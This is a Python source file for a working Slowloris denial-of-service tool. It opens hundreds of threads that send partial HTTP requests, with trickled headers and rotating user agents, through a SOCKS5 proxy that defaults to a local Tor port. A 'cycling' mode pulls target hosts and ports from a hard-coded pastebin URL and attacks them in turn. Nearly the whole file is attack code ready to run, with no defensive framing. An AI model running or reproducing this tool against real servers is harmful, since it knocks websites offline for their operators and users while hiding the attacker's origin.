###############################################################################
''''''
###############################################################################


from concurrent import futures
import time
import random
import logging
from logging.handlers import RotatingFileHandler
import string
from dataclasses import dataclass
import socket
import sys
import argparse
import itertools
import requests

import socks


logging.basicConfig(level=logging.INFO)


USERAGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    ]


def send_line(sock, line):
    line = f"{line}\r\n"
    sock.send(line.encode("utf-8"))

def send_header(sock, name, value):
    send_line(sock, f"{name}: {value}")


class Terminate(Exception):
    ...


def shutdown(sock, /):
    try:
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
    except Exception as exc:
        pass


@dataclass
class Slowloris:

    targethost: str
    targetport: int = 80
    lines: int = 500
    sleeptime: int = 10
    proxyhost: str = '127.0.0.1'
    proxyport: int = 9050

    def get_sock(self, /):
        socks.setdefaultproxy(
            socks.PROXY_TYPE_SOCKS5, self.proxyhost, self.proxyport
            )
        sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        return sock

    def attack(self, /, timeout=None, lineid: str = ''):
        start = time.time()
        if timeout is None:
            timeout = sys.maxsize
        sleeptime = self.sleeptime
        logger = logging.getLogger(lineid)
        targethost, targetport = self.targethost, self.targetport
        sock = None
        try:
            while (time.time() - start) < timeout:
                time.sleep(random.random())
                logger.info(f"{lineid}: Getting socket...")
                try:
                    sock = self.get_sock()
                except Exception as exc:
                    logger.info(f"{lineid}: Failed to create socket: {exc}")
                    raise Terminate from exc
                logger.info(f"{lineid}: Connecting to target {targethost} port {targetport}")
                try:
                    sock.connect((targethost, targetport))
                except socket.error as exc:
                    logger.info(f"{lineid}: Failed to connect to target: {exc}")
                    shutdown(sock)
                    raise Terminate from exc
                logger.info(f"{lineid}: Connected. Readying attack...")
                try:
                    send_line(
                        sock,
                        f"GET /?{random.randint(0, 2000)} HTTP/1.1",
                        )
                    ua = random.choice(USERAGENTS)
                    send_header(sock, "User-Agent", ua)
                    send_header(sock, "Accept-language", "en-US,en,q=0.5")
                except socket.error as exc:
                    logger.info(f"{lineid}: Socket error when readying attack: {exc}")
                    shutdown(sock)
                    raise Terminate from exc
                except Exception as exc:
                    logger.info(f"{lineid}: Failed to ready attack: {exc}")
                    raise Terminate from exc
                logger.info(f"{lineid}: Readied. Attacking...")
                while (time.time() - start) < timeout:
                    try:
                        send_header(
                            sock,
                            "X-a",
                            random.randint(1, 5000),
                            )
                    except socket.error as exc:
                        logger.info(f"{lineid} Socket error when attacking: {exc}; retrying...")
                        break
                    except Exception as exc:
                        logger.info(f"{lineid}: Failed when attacking: {exc}")
                        raise Terminate from exc
                    else:
                        time.sleep(
                            sleeptime
                            + sleeptime * (random.random() - 1)
                            )
                        logger.info(f"{lineid}: ...")
                else:
                    raise TimeoutError
            else:
                raise TimeoutError
        except TimeoutError:
            logger.info(
                f"{lineid}: Attack ended at specified timeout {timeout} seconds."
                )
        except Terminate:
            logger.info(
                f"{lineid}: Attack ended due to an error."
                )
        except Exception as exc:
            logger.info(f"{lineid}: Something went wrong: {exc}")
        if sock is not None:
            shutdown(sock)

    def __call__(self, /, timeout=None, parentid: str = ''):
        logger = logging.getLogger(parentid)
        if (logger.hasHandlers()):
            logger.handlers.clear()
        logger.addHandler(RotatingFileHandler(
            f'logs/{parentid}.log',
            maxBytes=2**20,
            backupCount=1,
            ))
        logger.info(f"Launching multiline attack...")
        nlines = self.lines
        with futures.ThreadPoolExecutor(nlines) as executor:
            jobs = []
            for i in range(nlines):
                future = executor.submit(
                    self.attack,
                    timeout=timeout,
                    lineid=f"{parentid}.Line{i}",
                    )
                time.sleep(random.random())
                jobs.append(future)
            out = futures.wait(jobs)
        logger.info(f"Multiline attack complete: {out}")


class CyclingSlowloris:

    DEFAULTSOURCE = "https://pastebin.com/raw/2ugHHQy1"

    def __init__(
            self, /, source: str = DEFAULTSOURCE, *args,
            innertimeout: int = 300, outertimeout: int = None, **kwargs
            ):
        self.source = source
        self.innertimeout, self.outertimeout = innertimeout, outertimeout
        self.subargs, self.subkwargs = args, kwargs

    def __call__(self, /, threadid: str = ''):
        logger = logging.getLogger(threadid)
        logger.info("Launching cycling attack...")
        start = time.time()
        if (timeout := self.outertimeout) is None:
            timeout = sys.maxsize
        while (time.time() - start) < timeout:
            host, *ports = random.choice(
                requests.get("https://pastebin.com/raw/2ugHHQy1", allow_redirects=True)
                .content.decode().split('\r\n')
                ).split(' ')
            port = int(random.choice(ports))
            Slowloris(host, port, *self.subargs, **self.subkwargs)(
                timeout=self.innertimeout,
                parentid=threadid,
                )
            time.sleep(random.random() + 1)
        else:
            logger.info(
                f"Cycling attack terminated "
                f"after requested timeout: {timeout} seconds"
                )

    def multi(self, /, nthreads: int, parentid: str = None):
        if parentid is None:
            parentid = ''.join(
                random.choice(string.ascii_uppercase + string.digits)
                for _ in range(16)
                )
        logger = logging.getLogger(parentid)
        logger.info(f"Launching cycling attack across {nthreads} threads...")
        with futures.ThreadPoolExecutor(nthreads) as executor:
            jobs = []
            for i in range(nthreads):
                future = executor.submit(self, threadid=f"{parentid}.Thread{i}")
                jobs.append(future)
            out = futures.wait(jobs)
        logger.info(f"Multithread cycling attack complete: {out}")


if __name__ == '__main__':

    parser = argparse.ArgumentParser(
        description='Launch a slowloris attack on the given target'
        )

    subparsers = parser.add_subparsers(dest='which')
    single, cycle = subs = tuple(map(subparsers.add_parser, ('single', 'cycle')))

    single.add_argument('targethost')
    single.add_argument(
        f'--port',
        type=int,
        dest='targetport',
        default=Slowloris.targetport,
        )

    cycle.add_argument(
        '--source',
        default=CyclingSlowloris.DEFAULTSOURCE,
        )
    cycle.add_argument(
        f'--threads',
        type=int,
        dest='threads',
        default=20,
        )

    for sub in subs:

        for name, typ in tuple(Slowloris.__annotations__.items())[2:]:
            sub.add_argument(
                f'--{name}',
                type=typ,
                dest=name,
                default=getattr(Slowloris, name, None),
                )

    single.add_argument(
        '--timeout',
        type=int,
        dest='timeout',
        )

    cycle.add_argument(
        '--innertimeout',
        type=int,
        dest='innertimeout',
        )
    cycle.add_argument(
        '--outertimeout',
        type=int,
        dest='outertimeout',
        )

    args = parser.parse_args()
    which = args.__dict__.pop('which')

    if which == 'single':
        timeout = args.__dict__.pop('timeout')
        Slowloris(**vars(args))(timeout)

    elif which == 'cycle':
        threads = args.__dict__.pop('threads')
        CyclingSlowloris(**vars(args)).multi(threads)

    else:
        raise ValueError(which)


###############################################################################
###############################################################################